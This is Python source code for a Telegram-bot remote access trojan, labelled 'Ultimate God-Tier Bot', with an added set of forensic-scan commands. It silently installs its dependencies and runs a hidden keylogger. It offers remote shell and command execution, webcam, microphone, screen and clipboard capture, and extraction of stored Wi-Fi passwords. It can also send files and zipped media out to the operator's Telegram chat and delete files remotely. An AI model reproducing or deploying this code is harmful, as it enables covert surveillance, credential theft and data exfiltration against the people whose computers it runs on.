import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import io
import contextlib

# 1. Wait for an active internet connection
def wait_for_internet():
    while True:
        try:
            urllib.request.urlopen('https://www.google.com', timeout=3)
            break
        except:
            time.sleep(5)

wait_for_internet()

# 2. Required libraries dictionary (Pip Name : Import Name)
required_libs = {
    "pyTelegramBotAPI": "telebot",
    "Pillow": "PIL",
    "opencv-python": "cv2",
    "psutil": "psutil",
    "sounddevice": "sounddevice",
    "scipy": "scipy",
    "pynput": "pynput",
    "pyperclip": "pyperclip",
    "mss": "mss",
    "numpy": "numpy",
    "tabulate": "tabulate",
    "geoip2": "geoip2"
}

# Configure subprocess to run completely hidden
startupinfo = None
if sys.platform == 'win32':
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0

# 3. Check and silently install missing libraries
for pip_name, import_name in required_libs.items():
    try:
        __import__(import_name)
    except ImportError:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pip_name],
                startupinfo=startupinfo,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except:
            pass

# 4. Import required libraries
import cv2
import mss
import numpy as np
import psutil
import pyperclip
import sounddevice as sd
from pynput import keyboard
import scipy.io.wavfile as wav
import telebot
from PIL import ImageGrab
import tabulate

# ---------- IMPORT FORENSIC MODULES ----------
import utils
import scanner
import network
import forensics

# --- BOT CONFIGURATION ---
TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_CHAT_ID = "YOUR_CHAT_ID_HERE"

bot = telebot.TeleBot(TOKEN)
active_shells = {}

# Keylogger variables
keylogger_active = False
logged_keys = ""

def on_press(key):
    global logged_keys
    if not keylogger_active:
        return
    try:
        logged_keys += str(key.char)
    except AttributeError:
        if key == key.space:
            logged_keys += " "
        elif key == key.enter:
            logged_keys += "\n"
        else:
            logged_keys += f" [{str(key)}] "

def start_keylogger():
    global keylogger_active
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=start_keylogger, daemon=True).start()

def is_authorized(message):
    return str(message.chat.id) == str(ADMIN_CHAT_ID)

# ---------- HELPER: Send long text as file ----------
def send_long_text(chat_id, text, filename="output.txt", caption=None):
    """
    If text is longer than 4000 characters, send it as a text file.
    Otherwise send as a normal message.
    """
    if len(text) <= 4000:
        bot.send_message(chat_id, f"```\n{text}\n```", parse_mode="Markdown")
    else:
        # Create a temporary file
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt', encoding='utf-8') as f:
            f.write(text)
            tmp_path = f.name
        with open(tmp_path, 'rb') as f:
            bot.send_document(chat_id, f, caption=caption or "📄 Output (too long for message)")
        os.remove(tmp_path)

# ---------- ORIGINAL RAT COMMANDS ----------
@bot.message_handler(commands=["cmd"])
def run_command(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    command = message.text[len("/cmd ") :].strip()
    if not command:
        bot.reply_to(message, "Please provide a command. Example: /cmd ipconfig")
        return
    try:
        output = subprocess.check_output(
            command, shell=True, text=True, encoding="cp850", timeout=60,
            startupinfo=startupinfo
        )
        if not output:
            output = "Command executed successfully (No output)."
    except subprocess.TimeoutExpired:
        output = "Error: Command execution timed out after 60 seconds."
    except Exception as e:
        output = f"Error: {str(e)}"
    send_long_text(message.chat.id, output, filename="cmd_output.txt", caption="📟 Command Output")

@bot.message_handler(commands=["shell"])
def toggle_shell(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    arg = message.text[len("/shell ") :].strip().lower()
    if arg == "on":
        active_shells[message.chat.id] = True
        bot.reply_to(message, "Interactive Shell **ENABLED**. Type `/shell off` to exit.", parse_mode="Markdown")
    elif arg == "off":
        active_shells[message.chat.id] = False
        bot.reply_to(message, "Interactive Shell **DISABLED**.", parse_mode="Markdown")
    else:
        status = "ENABLED" if active_shells.get(message.chat.id, False) else "DISABLED"
        bot.reply_to(message, f"Shell status is **{status}**.", parse_mode="Markdown")

@bot.message_handler(commands=["screenshot"])
def take_screenshot(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        bot.reply_to(message, "Taking screenshot...")
        screenshot_path = os.path.join(tempfile.gettempdir(), "screen.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        with open(screenshot_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo, timeout=30)
        os.remove(screenshot_path)
    except Exception as e:
        bot.reply_to(message, f"Error taking screenshot: {str(e)}")

@bot.message_handler(commands=["screenrec"])
def record_screen(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "Recording background screen (3 seconds, compressed format)...")
    output_file = None
    try:
        duration = 3
        fps = 10
        output_file = os.path.join(tempfile.gettempdir(), "screen_recording.mp4")
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            width = monitor["width"]
            height = monitor["height"]
            fourcc = cv2.VideoWriter_fourcc(*"mp4v")
            out = cv2.VideoWriter(output_file, fourcc, fps, (width, height))
            start_time = time.time()
            while time.time() - start_time < duration:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            out.release()
        with open(output_file, "rb") as vid:
            bot.send_video(message.chat.id, vid, caption="🖥️ **Background Screen Recording**", supports_streaming=True, timeout=60)
    except Exception as e:
        bot.reply_to(message, f"Error recording/sending screen: {str(e)}")
    finally:
        if output_file and os.path.exists(output_file):
            try: os.remove(output_file)
            except: pass

@bot.message_handler(commands=["webcam"])
def take_webcam_photo(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        bot.reply_to(message, "Accessing webcam...")
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            bot.reply_to(message, "Error: Could not open webcam.")
            return
        ret, frame = cam.read()
        cam.release()
        if ret:
            img_path = os.path.join(tempfile.gettempdir(), "webcam.jpg")
            cv2.imwrite(img_path, frame)
            with open(img_path, "rb") as photo:
                bot.send_photo(message.chat.id, photo, timeout=30)
            os.remove(img_path)
        else:
            bot.reply_to(message, "Error: Could not capture frame from webcam.")
    except Exception as e:
        bot.reply_to(message, f"Webcam error: {str(e)}")

@bot.message_handler(commands=["sysinfo"])
def system_info(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        battery = psutil.sensors_battery()
        battery_info = f"{battery.percent}% ({'Plugged In' if battery.power_plugged else 'Discharging'})" if battery else "N/A"
        info = (
            f"💻 **System Status:**\n\n"
            f"• **CPU Usage:** {cpu_usage}%\n"
            f"• **RAM Usage:** {ram.percent}% (Used: {ram.used // (1024**2)}MB / Total: {ram.total // (1024**2)}MB)\n"
            f"• **Battery:** {battery_info}"
        )
        bot.reply_to(message, info, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"Error fetching system info: {str(e)}")

@bot.message_handler(commands=["keylog"])
def control_keylogger(message):
    global keylogger_active, logged_keys
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    arg = message.text[len("/keylog ") :].strip().lower()
    if arg == "on":
        keylogger_active = True
        bot.reply_to(message, "Keylogger **STARTED**.", parse_mode="Markdown")
    elif arg == "off":
        keylogger_active = False
        bot.reply_to(message, "Keylogger **STOPPED**.", parse_mode="Markdown")
    elif arg == "get":
        if not logged_keys:
            bot.reply_to(message, "Keylogger data is empty.")
        else:
            data = logged_keys
            logged_keys = ""
            send_long_text(message.chat.id, data, filename="keylog.txt", caption="⌨️ Keystroke Logs")
    else:
        bot.reply_to(message, "Use `/keylog on`, `/keylog off`, or `/keylog get`.", parse_mode="Markdown")

@bot.message_handler(commands=["rec"])
def record_audio(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        duration = int(message.text[len("/rec ") :].strip())
        if duration > 30: duration = 30
        bot.reply_to(message, f"Recording audio for {duration} seconds...")
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        audio_path = os.path.join(tempfile.gettempdir(), "rec.wav")
        wav.write(audio_path, fs, recording)
        with open(audio_path, "rb") as audio:
            bot.send_voice(message.chat.id, audio, timeout=30)
        os.remove(audio_path)
    except Exception as e:
        bot.reply_to(message, f"Error recording audio: {str(e)}")

@bot.message_handler(commands=["wifi"])
def get_wifi_passwords(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        output = ""
        profiles_data = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, encoding="cp850", timeout=15, startupinfo=startupinfo)
        profiles = [line.split(":")[1].strip() for line in profiles_data.split("\n") if "All User Profile" in line]
        for profile in profiles:
            try:
                results = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, encoding="cp850", timeout=10, startupinfo=startupinfo)
                password = "None"
                for line in results.split("\n"):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                output += f"SSID: {profile} | Password: {password}\n"
            except: continue
        if not output: output = "No Wi-Fi profiles found."
        send_long_text(message.chat.id, output, filename="wifi.txt", caption="📶 Wi-Fi Passwords")
    except Exception as e:
        bot.reply_to(message, f"Error fetching Wi-Fi: {str(e)}")

@bot.message_handler(commands=["search"])
def search_file(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    query = message.text[len("/search ") :].strip()
    if not query:
        bot.reply_to(message, "Please provide a file name. Example: /search movie.mp4")
        return
    try:
        bot.reply_to(message, "Searching for file across C drive...")
        matches = []
        start_time = time.time()
        for root, dirs, files in os.walk("C:\\"):
            if time.time() - start_time > 25:
                matches.append("[!] Search stopped early due to time limit (25s timeout).")
                break
            try:
                if query.lower() in [f.lower() for f in files]:
                    matches.append(os.path.join(root, query))
                    if len(matches) >= 10: break
            except: continue
        output = "\n".join(matches) if matches else "No files found."
        send_long_text(message.chat.id, output, filename="search.txt", caption="🔍 Search Results")
    except Exception as e:
        bot.reply_to(message, f"Error searching: {str(e)}")

@bot.message_handler(commands=["clipboard"])
def get_clipboard(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    try:
        clip_text = pyperclip.paste()
        bot.reply_to(message, f"📋 **Clipboard Text:**\n\n`{clip_text}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["shutdown", "restart"])
def power_control(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    cmd_type = message.text.strip().lower()
    try:
        if "shutdown" in cmd_type:
            bot.reply_to(message, "Shutting down laptop...")
            os.system("shutdown /s /t 5")
        elif "restart" in cmd_type:
            bot.reply_to(message, "Restarting laptop...")
            os.system("shutdown /r /t 5")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["getfile"])
def send_file(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    file_path = message.text[len("/getfile ") :].strip()
    if os.path.exists(file_path):
        try:
            bot.reply_to(message, "Sending file, please wait...")
            with open(file_path, "rb") as f:
                bot.send_document(message.chat.id, f, timeout=120)
        except Exception as e:
            bot.reply_to(message, f"Error sending file: {str(e)}")
    else:
        bot.reply_to(message, "Error: File not found on the laptop!")

@bot.message_handler(commands=["ls"])
def list_directory(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    path = message.text[len("/ls ") :].strip()
    if not path:
        bot.reply_to(message, "Please provide a path. Example: `/ls C:`", parse_mode="Markdown")
        return
    if not os.path.exists(path):
        bot.reply_to(message, f"Error: Path not found: {path}")
        return
    try:
        items = os.listdir(path)
        folders = []
        files = []
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                folders.append(f"📁 [DIR]  {item}")
            else:
                files.append(f"📄 [FILE] {item}")
        output_list = folders + files
        output_text = "\n".join(output_list)
        if not output_text: output_text = "Directory is empty."
        send_long_text(message.chat.id, output_text, filename="ls.txt", caption=f"📂 Contents of {path}")
    except Exception as e:
        bot.reply_to(message, f"Error listing directory: {str(e)}")

def handle_media_request(message, file_extensions, category_name):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 2:
        bot.reply_to(message, f"Usage: `/{category_name} <path>` or `/{category_name} zip <path>`", parse_mode="Markdown")
        return
    is_zip_mode = parts[1].lower() == "zip"
    folder_path = parts[2] if is_zip_mode and len(parts) > 2 else parts[1]
    if not os.path.isdir(folder_path):
        bot.reply_to(message, f"Error: Directory not found: {folder_path}")
        return
    try:
        bot.reply_to(message, f"Scanning directory for {category_name} files (please wait)...")
        matched_files = []
        search_start = time.time()
        for root, _, files in os.walk(folder_path):
            if time.time() - search_start > 45: break
            for file in files:
                if file.lower().endswith(file_extensions):
                    matched_files.append(os.path.join(root, file))
        if not matched_files:
            bot.reply_to(message, "No matching files found in the specified directory.")
            return
        if is_zip_mode:
            bot.reply_to(message, f"Archiving {len(matched_files)} files into a ZIP, please wait...")
            temp_dir = tempfile.gettempdir()
            zip_path_base = os.path.join(temp_dir, f"{category_name}_archive")
            archive_dir = os.path.join(temp_dir, "staging_folder")
            if os.path.exists(archive_dir): shutil.rmtree(archive_dir)
            os.makedirs(archive_dir)
            for f_path in matched_files:
                try: shutil.copy(f_path, archive_dir)
                except: pass
            zip_file = shutil.make_archive(zip_path_base, "zip", archive_dir)
            shutil.rmtree(archive_dir)
            with open(zip_file, "rb") as zf:
                bot.send_document(message.chat.id, zf, timeout=120)
            os.remove(zip_file)
        else:
            txt_list_path = os.path.join(tempfile.gettempdir(), f"{category_name}_list.txt")
            with open(txt_list_path, "w", encoding="utf-8") as f:
                f.write(f"=== Found {len(matched_files)} {category_name.upper()} files ===\n\n")
                for f_path in matched_files:
                    f.write(f"{f_path}\n")
            with open(txt_list_path, "rb") as txt_file:
                bot.send_document(message.chat.id, txt_file, caption=f"📁 List of {category_name.capitalize()} Files", timeout=60)
            if os.path.exists(txt_list_path): os.remove(txt_list_path)
    except Exception as e:
        bot.reply_to(message, f"Error processing request: {str(e)}")

@bot.message_handler(commands=["images"])
def get_images(message):
    handle_media_request(message, (".png", ".jpg", ".jpeg", ".bmp", ".gif", ".webp"), "images")

@bot.message_handler(commands=["videos"])
def get_videos(message):
    handle_media_request(message, (".mp4", ".mkv", ".avi", ".mov", ".flv", ".wmv", ".webm"), "videos")

@bot.message_handler(commands=["pdf"])
def get_pdfs(message):
    handle_media_request(message, (".pdf",), "pdf")

@bot.message_handler(func=lambda message: active_shells.get(message.chat.id, False))
def handle_shell_input(message):
    if not is_authorized(message): return
    if message.text.startswith("/"): return
    command = message.text
    try:
        output = subprocess.check_output(command, shell=True, text=True, encoding="cp850", timeout=60, startupinfo=startupinfo)
        if not output: output = "Executed successfully (No output)."
    except subprocess.TimeoutExpired:
        output = "Error: Shell command timed out after 60 seconds."
    except Exception as e:
        output = f"Error: {str(e)}"
    send_long_text(message.chat.id, output, filename="shell.txt", caption="📟 Shell Output")

@bot.message_handler(commands=["delete"])
def delete_path(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    path = message.text[len("/delete ") :].strip()
    if not path:
        bot.reply_to(message, "Please provide a path. Example: `/delete C:\\path\\to\\file.txt`", parse_mode="Markdown")
        return
    if not os.path.exists(path):
        bot.reply_to(message, f"Error: Path not found: {path}")
        return
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
            bot.reply_to(message, f"🗑️ Directory successfully deleted:\n`{path}`", parse_mode="Markdown")
        else:
            os.remove(path)
            bot.reply_to(message, f"🗑️ File successfully deleted:\n`{path}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"Error deleting path: {str(e)}")

@bot.message_handler(commands=["start"])
def send_welcome(message):
    if is_authorized(message):
        help_text = (
            "👑 **Ultimate God-Tier Bot Online!**\n\n"
            "**--- RAT COMMANDS ---**\n"
            "• `/cmd <command>` - Run CMD\n"
            "• `/shell on/off` - Interactive shell\n"
            "• `/ls <path>` - List folders/files\n"
            "• `/screenshot` - Screen photo\n"
            "• `/screenrec` - Record screen (3s)\n"
            "• `/webcam` - Webcam photo\n"
            "• `/sysinfo` - CPU, RAM, Battery\n"
            "• `/keylog on/off/get` - Keyboard tracker\n"
            "• `/rec <sec>` - Record microphone\n"
            "• `/wifi` - Get Wi-Fi passwords\n"
            "• `/search <name>` - Search files\n"
            "• `/clipboard` - Get copied text\n"
            "• `/shutdown` / `/restart` - Power controls\n"
            "• `/getfile <path>` - Download files\n"
            "• `/delete <path>` - Delete file/folder\n"
            "• `/images /videos /pdf` - Media handlers\n\n"
            "**--- FORENSIC COMMANDS ---**\n"
            "• `/forensic` - Show forensic menu\n"
            "• `/processes` - Active processes & signatures\n"
            "• `/network` - Network connections & Geo-IP\n"
            "• `/persistence` - Registry, Startup, WMI, Browser\n"
            "• `/files` - Recent files, Prefetch, USB\n"
            "• `/eventlogs` - Security, PowerShell logs\n"
            "• `/tactical` - 10-Step FBI audit\n"
            "• `/triage` - 25-Step live response\n"
            "• `/export` - Export all evidence\n\n"
            "📌 **Note:** Long outputs are sent as text files."
        )
        bot.reply_to(message, help_text, parse_mode="Markdown")
    else:
        bot.reply_to(message, "Unauthorized user!")

# ---------- FORENSIC COMMAND HANDLERS ----------
@bot.message_handler(commands=["forensic"])
def forensic_menu(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    menu = """
🔍 **AEGIS-X FORENSIC CORE**

**Available Commands:**
[1] `/processes`      - Active Processes & Signatures
[2] `/network`        - Network Connections & Geo-IP
[3] `/persistence`    - Registry, Startup, WMI, Browser Extensions
[4] `/files`          - Recent Files, Prefetch, ADS, USB History
[5] `/eventlogs`      - Windows Security, PowerShell, System Logs
[6] `/tactical`       - 10-Step FBI Tactical Audit
[7] `/triage`         - 25-Step Live Response Triage
[8] `/export`         - Export All Evidence to File

Type `/help` for all RAT commands.
"""
    bot.reply_to(message, menu, parse_mode="Markdown")

@bot.message_handler(commands=["processes"])
def get_processes(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "🔍 Scanning active processes...")
    try:
        procs = scanner.get_active_processes()
        output = "📋 **Active Processes**\n\n"
        for p in procs:
            output += f"• PID: {p['pid']} | {p['name']} | {p['status']}\n"
        send_long_text(message.chat.id, output, filename="processes.txt", caption="📋 Process List")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["network"])
def get_network(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "🌐 Scanning network connections...")
    try:
        conns = network.get_network_connections()
        output = "🌐 **Network Connections**\n\n"
        for c in conns:
            output += f"• {c['name']} | {c['ip']} | {c['country']}\n"
        send_long_text(message.chat.id, output, filename="network.txt", caption="🌐 Network Connections")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["persistence"])
def get_persistence(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "🔍 Hunting for persistence mechanisms...")
    try:
        reg = scanner.get_registry_persistence()
        startup = scanner.get_startup_folders()
        wmi = scanner.get_wmi_persistence()
        browser = scanner.get_browser_extensions()
        output = "🔍 **Persistence Mechanisms**\n\n"
        output += f"• Registry Entries: {len(reg)}\n"
        output += f"• Startup Files: {len(startup)}\n"
        output += f"• WMI Subscriptions: {len(wmi)}\n"
        output += f"• Browser Extensions: {len(browser)}\n"
        if reg:
            output += "\n**Registry RunKeys:**\n"
            for r in reg:
                output += f"  • {r['name']} -> {r['value']}\n"
        send_long_text(message.chat.id, output, filename="persistence.txt", caption="🔍 Persistence Mechanisms")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["files"])
def get_files(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "📁 Scanning file system...")
    try:
        recent = forensics.get_recent_files(days=3)
        prefetch = forensics.get_prefetch_files()
        usb = forensics.get_usb_history()
        output = "📁 **File System Forensics**\n\n"
        output += f"• Recent Files (3 days): {len(recent)}\n"
        output += f"• Prefetch Files: {len(prefetch)}\n"
        output += f"• USB Devices: {len(usb)}\n"
        if recent:
            output += "\n**Recent Files:**\n"
            for f in recent[:20]:
                output += f"  • {os.path.basename(f['path'])} ({f['last_modified']})\n"
        if prefetch:
            output += "\n**Prefetch Files:**\n"
            for f in prefetch[:20]:
                output += f"  • {f}\n"
        if usb:
            output += "\n**USB Devices:**\n"
            for d in usb[:20]:
                output += f"  • {d}\n"
        send_long_text(message.chat.id, output, filename="files.txt", caption="📁 File System Forensics")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["eventlogs"])
def get_eventlogs(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "📋 Extracting event logs...")
    try:
        security = forensics.get_event_logs('Security', 4688, 50)
        powershell = forensics.get_event_logs('Windows PowerShell', 4104, 20)
        output = "📋 **Event Logs**\n\n"
        output += f"• Security Events (ID 4688): {len(security)}\n"
        output += f"• PowerShell Events (ID 4104): {len(powershell)}\n"
        if security:
            output += "\n**Recent Process Creations (Security):**\n"
            for ev in security[:20]:
                output += f"  • [{ev['time']}] {ev['message'][:100]}...\n"
        if powershell:
            output += "\n**PowerShell Script Blocks:**\n"
            for ev in powershell[:10]:
                output += f"  • [{ev['time']}] {ev['message'][:100]}...\n"
        send_long_text(message.chat.id, output, filename="eventlogs.txt", caption="📋 Event Logs")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["tactical"])
def run_tactical(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "🔍 Running FBI Tactical Audit (10 steps)...")
    try:
        output = forensics.get_tactical_audit_output()
        send_long_text(message.chat.id, output, filename="tactical.txt", caption="📊 FBI Tactical Audit")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["triage"])
def run_triage(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "🔍 Running Live Response Triage (25 steps)...")
    try:
        output = forensics.get_triage_output()
        send_long_text(message.chat.id, output, filename="triage.txt", caption="📊 Live Response Triage")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=["export"])
def export_evidence(message):
    if not is_authorized(message):
        bot.reply_to(message, "Unauthorized user!")
        return
    bot.reply_to(message, "📦 Exporting all evidence...")
    try:
        filename = forensics.export_all_evidence()
        if os.path.exists(filename):
            with open(filename, "rb") as f:
                bot.send_document(message.chat.id, f, caption="📦 Evidence Export File")
            os.remove(filename)
        else:
            bot.reply_to(message, "Export completed but file not found.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

print("Ultimate God-Tier Bot with Forensic Modules is running...")
bot.polling()
